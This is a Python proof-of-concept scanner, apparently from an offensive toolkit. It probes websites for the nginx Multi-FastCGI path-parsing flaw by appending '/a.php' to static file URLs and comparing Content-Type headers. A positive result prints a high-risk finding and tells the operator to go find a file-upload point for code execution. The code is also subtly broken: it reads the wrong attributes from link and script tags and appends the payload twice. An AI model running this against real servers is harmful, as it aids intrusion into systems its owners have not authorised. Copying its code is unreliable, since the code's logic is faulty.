#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: nginx Multi-FastCGI Code Execution
referer: http://drops.wooyun.org/tips/2006
author: Lucifer,xiaokv
description: nginx解析漏洞，代码执行
'''
import sys
import requests
from bs4 import BeautifulSoup

class multi_fastcgi_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def catch(self, url):
        static_url = []
        robots_url = url + "/robots.txt"
        req = requests.get(robots_url, timeout=10, verify=False)
        if req.status_code == 200 and r"Disallow" in req.text:
            static_url.append(robots_url)
            return static_url

        else:
            req = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(req.text, "html.parser")
            try:
                imgs = soup.find_all("img")
                csss = soup.find_all("link")
                jss = soup.find_all("script")

                for img in imgs:
                    static_url.append(img["src"])
                for css in csss:
                    static_url.append(css["src"])
                for js in jss:
                    static_url.append(js["href"])

            except:
                pass
            return static_url

    def run(self):
        payload = "/a.php"
        try:
            turl = self.catch(self.url)
            if len(turl) != 1:
                for rurl in turl:
                    if r"http" not in self.url or r"https" not in self.url: 
                        rurl = self.url + "/" + rurl 
                    vulnurl = rurl + payload
                    html = requests.get(rurl, timeout=10, verify=False)
                    poc = requests.get(vulnurl + payload, timeout=10, verify=False)
                    if html.headers["Content-Type"] != poc.headers["Content-Type"]:
                        return "[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~"
            else:
                rurl = ''.join(turl)
                vulnurl = rurl + payload
                html = requests.get(rurl, timeout=10, verify=False)
                poc = requests.get(vulnurl + payload, timeout=10, verify=False)
                if html.headers["Content-Type"] != poc.headers["Content-Type"]:
                    return "[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~"
                else:
                    return "[-]no vuln"
        except:
            return "[-] ====>连接超时"

if __name__ == "__main__":
    testVuln = multi_fastcgi_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()
